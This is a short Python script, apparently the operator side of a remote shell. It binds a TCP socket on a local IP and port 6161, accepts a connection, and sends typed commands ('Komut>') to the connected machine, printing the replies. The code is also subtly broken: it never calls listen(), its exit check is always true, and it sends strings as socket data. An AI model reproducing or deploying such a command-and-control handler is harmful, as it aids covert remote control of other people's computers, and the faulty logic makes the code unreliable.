import socket
port = 6161
ip = "192.168.0.28"
def yolla():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((ip,port))

    socketaddr,ipaddr = s.accept()
    print('[+]Baglanti basariyla saglandi ', ipaddr)
    while True:
        komut = input('[*]Komut> ')
        if 'cikis' or 'exit' or 'finish' in komut:
            socketaddr.send('cikis')
            socketaddr.close()
            break
        else:
            socketaddr.send(komut)
            print(socketaddr.recv(1024))
yolla()
